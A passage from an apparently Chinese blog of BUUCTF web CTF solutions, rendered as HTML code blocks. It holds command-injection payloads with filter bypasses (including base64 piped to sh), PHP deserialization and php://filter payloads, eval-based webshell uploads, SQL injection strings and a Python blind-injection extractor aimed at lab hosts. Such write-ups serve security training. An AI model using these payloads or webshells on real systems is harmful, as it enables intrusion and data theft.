+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a = new Name(&apos;admin&apos;,100);</span><br><span class="line">$b=serialize($a);</span><br><span class="line">echo urlencode($b);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $b;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure>
+<p>打印出来的可见字符为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+<p>修改name和加上%00即可得到flag，最终POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+<p>修改为3是为了绕过__wakeup()函数，使username不被覆盖，加上%00是因为username和password都是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失</p>
+<p>反序列化知识文章：<a href="https://xz.aliyun.com/t/6753" target="_blank" rel="noopener">一文让PHP反序列化从入门到进阶</a></p>
+<h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>看题目是一到命令注入的题目</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1|ls</span><br></pre></td></tr></table></figure>
+<p>看到有flag.php文件</p>
+<p>直接cat flag被拦截了</p>
+<p>看了一下是空格等一些特殊符号被过滤了,fuzz一下发现下面的符号没被过滤</p>
+<p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200720111907377.png" alt="image-20200720111907377"></p>
+<p>cat$IFSflag.php发现被过滤了flag字符串</p>
+<p>构造最终pyaload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>
+<p>或者过滤了bash用sh</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1|echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
+<p>或者反引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure>
+<h3 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h3><p>看到一句话直接连上去</p>
+<h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p>看了一下直接用 php伪协议读就行了 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>首先上传一个.user.ini的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line">auto_prepend_file=a.jpg</span><br></pre></td></tr></table></figure>
+<p>然后构造一个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&apos;php&apos;&gt; @eval($_POST[&apos;pass&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>然后将两个文件分别上传到服务器上，拿到回显：</p>
+<p>再访问，连接上菜刀得到lflag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://6ca7562e-3704-4f8c-9ec3-24709b40fd97.node3.buuoj.cn/uploads/adeee0c170ad4ffb110df0cde294aecd/index.php</span><br></pre></td></tr></table></figure>
+<h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p>根据页面提示分别添加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://www.Sycsecret.com</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200720142225713.png" alt="image-20200720142225713"></p>
+<h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p>命令注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|ls /</span><br><span class="line">再</span><br><span class="line">127.0.0.1|cat /flag</span><br></pre></td></tr></table></figure>
+<h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p>测试了一下发现闭合成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=admin&apos;%23&amp;password=123456</span><br></pre></td></tr></table></figure>
+<p>输入下面两个payload根据报错发现过滤了or</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=admin&apos; o1r 1=1%23&amp;password=123456</span><br><span class="line">check.php?username=admin&apos; or 1=1%23&amp;password=123456</span><br></pre></td></tr></table></figure>
+<p>使用<code>oorr</code>发现可以bypass</p>
+<p>双写pypass</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://b8cb5268-511b-42fa-86f8-b1d0cd07d936.node3.buuoj.cn/check.php</span><br><span class="line">?username=adm1in&apos; ununionion seselectlect 1,2,3%23</span><br><span class="line">&amp;password=123456</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200720144618205.png" alt="image-20200720144618205"></p>
+<p>根据规则构造语句爆库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://b8cb5268-511b-42fa-86f8-b1d0cd07d936.node3.buuoj.cn/check.php</span><br><span class="line">?username=adm1in&apos; ununionion seselectlect 1,2,</span><br><span class="line">group_concat(schema_name) frfromom infoorrmation_schema.schemata</span><br><span class="line">%23</span><br><span class="line">&amp;password=123456</span><br><span class="line">select schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure>
+<p>爆表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://b8cb5268-511b-42fa-86f8-b1d0cd07d936.node3.buuoj.cn/check.php</span><br><span class="line">?username=adm1in&apos; ununionion seselectlect 1,2,</span><br><span class="line">group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()</span><br><span class="line">%23</span><br><span class="line">&amp;password=123456</span><br></pre></td></tr></table></figure>
+<p>发现表有<code>ctf</code>    </p>
+<p>爆列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://b8cb5268-511b-42fa-86f8-b1d0cd07d936.node3.buuoj.cn/check.php</span><br><span class="line">?username=adm1in&apos; ununionion seselectlect 1,2,</span><br><span class="line">group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=&apos;ctf&apos;</span><br><span class="line">%23</span><br><span class="line">&amp;password=123456</span><br></pre></td></tr></table></figure>
+<p>发现有flag列</p>
+<p>直接得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(flag) frfromom ctf.Flag</span><br></pre></td></tr></table></figure>
+<h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">All You Want Is In Table &apos;flag&apos; and the column is &apos;flag&apos;</span><br></pre></td></tr></table></figure>
+<p>发现过滤了不少函数和符号，在过滤了空格时可以用下面这种形式绕过空格检测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(flag)from(flag)</span><br></pre></td></tr></table></figure>
+<p>异或盲注</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0^(ascii(substr((select(flag)from(flag)),1,1))=1)</span><br></pre></td></tr></table></figure>
+<p>编写盲注脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">	for k in range(32,127):</span><br><span class="line">		payload=&quot;0^(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))=&#123;1&#125;)&quot;.format(i,k)</span><br><span class="line">		data=&#123;&quot;id&quot;:payload&#125;</span><br><span class="line">		r = requests.post(&quot;http://46fc8e21-55b1-4fa5-a43c-0ec93a61474a.node3.buuoj.cn/index.php&quot;,data=data)</span><br><span class="line">		if &quot;Hello&quot; in r.text:</span><br><span class="line">			flag=flag+chr(k)</span><br><span class="line">			print flag</span><br></pre></td></tr></table></figure>
+<p>跑出flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b6b8b3fc-ee39-4317-9378-62dbe3b9fcc1&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h3><p>注册一个账号进去加单引号报错发现有注入</p>
+<p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200720163553250.png" alt="image-20200720163553250"></p>
+<p>发现有过滤，尝试报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(&apos;~&apos;,(select(group_concat(database())))))%23</span><br></pre></td></tr></table></figure>
+<p>得到数据库名<code>fakebook</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(&apos;~&apos;,(select data from users)))%23</span><br></pre></td></tr></table></figure>
+<p>发现data字段是个反序列化数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:</span><br></pre></td></tr></table></figure>
+<p>尝试拼接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(&apos;~&apos;,(select group_concat(right(data,32)) from users)))%23</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i:18;s:4:&quot;blog&quot;;s:8:&quot;lego.com&quot;</span><br><span class="line">s:4:&quot;name&quot;;s:4:&quot;lego&quot;;s:3:&quot;age&quot;</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:</span><br><span class="line">得出</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;name&quot;;s:4:&quot;lego&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:8:&quot;lego.com&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>访问robots.txt发现有提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure>
+<p>发现是一段序列化的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;1&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;file:///var/www/html/flag.php&quot;;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new UserInfo();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>构造poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=0 union/**/select/**/21,11,21,&apos;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&apos;%23</span><br></pre></td></tr></table></figure>
+<p>查看源码发现有个base64数据，解码可得flag</p>
+<h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>用burp fuzz后缀</p>
+<p>发现可以上传phtml文件</p>
+<p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200721105639085.png" alt="image-20200721105639085"></p>
+<p>插入php代码，发现存在内容检测，不能直接插入&lt;?php&gt;这种标签</p>
+<p>插入这种标签即可绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&apos;php&apos;&gt; @eval($_POST[&apos;pass&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><p>这题以前做过，写脚本跑哪个是shell文件的，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:UTF-8 -*-</span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">print(&apos;开始时间：  &apos;+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(100)  							#这儿设置最大的线程数</span><br><span class="line">requests.adapters.DEFAULT_RETRIES = 5					#设置重连次数，防止线程数过高，断开连接</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = False								#设置连接活跃状态为False</span><br><span class="line">filePath = r&quot;C:/Users/Think/Desktop/www/src&quot;            #自己替换为文件所在目录</span><br><span class="line">os.chdir(filePath)										#改变当前的路径</span><br><span class="line">files = os.listdir(filePath)                            #获取文件列表</span><br><span class="line"></span><br><span class="line">def get_content(file):</span><br><span class="line">    s1.acquire()</span><br><span class="line">    print(&apos;trying   &apos;+file+ &apos;     &apos;+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    with open(file,encoding=&apos;utf-8&apos;) as f:				#打开php文件，提取所有的$_GET和$_POST的参数</span><br><span class="line">            gets = list(re.findall(&apos;\$_GET\[\&apos;(.*?)\&apos;\]&apos;, f.read()))</span><br><span class="line">            posts = list(re.findall(&apos;\$_POST\[\&apos;(.*?)\&apos;\]&apos;, f.read()))</span><br><span class="line">    data = &#123;&#125;											#所有的$_POST</span><br><span class="line">    params = &#123;&#125;											#所有的$_GET</span><br><span class="line">    for m in gets:</span><br><span class="line">        params[m] = &quot;echo &apos;xxxxxx&apos;;&quot;</span><br><span class="line">    for n in posts:</span><br><span class="line">        data[n] = &quot;echo &apos;xxxxxx&apos;;&quot;</span><br><span class="line">    url = &apos;http://127.0.0.1/src/&apos;+file                  #自己替换为本地url</span><br><span class="line">    req = session.post(url, data=data, params=params)	#一次性请求所有的GET和POST</span><br><span class="line">    req.close()											#关闭请求  释放内存</span><br><span class="line">    req.encoding = &apos;utf-8&apos;</span><br><span class="line">    content = req.text</span><br><span class="line">    #print(content)</span><br><span class="line">    if &quot;xxxxxx&quot; in content:								#如果发现有可以利用的参数，继续筛选出具体的参数</span><br><span class="line">        flag = 0</span><br><span class="line">        for a in gets:</span><br><span class="line">            req = session.get(url+&apos;?%s=&apos;%a+&quot;echo &apos;xxxxxx&apos;;&quot;)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()									# 关闭请求  释放内存</span><br><span class="line">            if &quot;xxxxxx&quot; in content:</span><br><span class="line">                flag = 1</span><br><span class="line">                break</span><br><span class="line">        if flag != 1:</span><br><span class="line">            for b in posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:&quot;echo &apos;xxxxxx&apos;;&quot;&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()								# 关闭请求  释放内存</span><br><span class="line">                if &quot;xxxxxx&quot; in content:</span><br><span class="line">                    break</span><br><span class="line">        if flag == 1: #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span><br><span class="line">            param = a</span><br><span class="line">        else:</span><br><span class="line">            param = b</span><br><span class="line">        print(&apos;找到了利用文件： &apos;+file+&quot;  and 找到了利用的参数：%s&quot; %param)</span><br><span class="line">        print(&apos;结束时间：  &apos; + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line">for i in files:															#加入多线程</span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>
+<p>最后跑出来是xk0SzyKwfzw.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xk0SzyKwfzw.php?Efa5BVG=cat /flag</span><br></pre></td></tr></table></figure>
+<h3 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h3><p>查看源码发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">	$password = $_POST[&apos;password&apos;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&apos;t be number&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password == 404) &#123;</span><br><span class="line">		echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>考点</p>
+<ul>
+<li><p>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！</p>
+</li>
+<li><p>此题用到的是PHP 5.3.5，老版本PHP了。要求我们不能输入8位字符，而输入其他任何字符都会返回you have not enough money,loser~，合理猜测一下用的是strcmp，那么直接money[]传入一个数组就好了。</p>
+</li>
+</ul>
+<p>bp抓包：将user=1,且password=404%20</p>
+<p>然后还要 money=100000000</p>
+<p>传入一个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=404%20&amp;money[]=111</span><br></pre></td></tr></table></figure>
+<h3 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h3><p>index.php.bak有源码泄露</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;key&apos;])) &#123;</span><br><span class="line">    $key = $_GET[&apos;key&apos;];</span><br><span class="line">    if(!is_numeric($key)) &#123;   </span><br><span class="line">        exit(&quot;Just num!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class="line">    if($key == $str) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;Try to find out source file!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>弱类型匹配key=123传入参数就可以得到flag了</p>
+<h3 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h3><p>上传点存在php黑名单，可以用phtml绕过黑名单限制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&apos;cat /flag&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>上传一个这个可得到flag</p>
+<p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200728141249042.png" alt="image-20200728141249042"></p>
+<h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p>访问得到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&apos;r&apos;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&apos;r&apos;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>isset — 检测变量是否已设置并且非 NULL<br>file_get_contents — 将整个文件读入一个字符串</p>
+<p>通过data协议绕过第一个if</p>
+<p>伪协议读uselist.php内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>序列化数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>构造最终poc</p>
